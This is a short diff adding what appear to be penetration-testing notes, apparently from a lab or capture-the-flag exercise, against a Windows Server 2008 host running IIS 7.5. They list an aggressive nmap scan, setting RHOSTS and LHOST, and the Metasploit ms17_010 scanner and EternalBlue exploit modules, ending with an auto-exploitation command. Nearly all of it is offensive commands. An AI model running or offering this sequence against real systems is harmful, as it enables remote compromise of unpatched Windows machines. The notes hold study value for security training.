@@ -1,0 +1,11 @@
+db_nmap -sS -Pn -A -T5 "IP"
+
+PORT: 80 MS IIS httpd 7.5
+PORT: 445 MS WINDOWS SERVER 2008
+
+COnfigure RHOSTS & LHOST
+
+use auxiliary/scanner/smb/ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
+
+db_auto-pwn
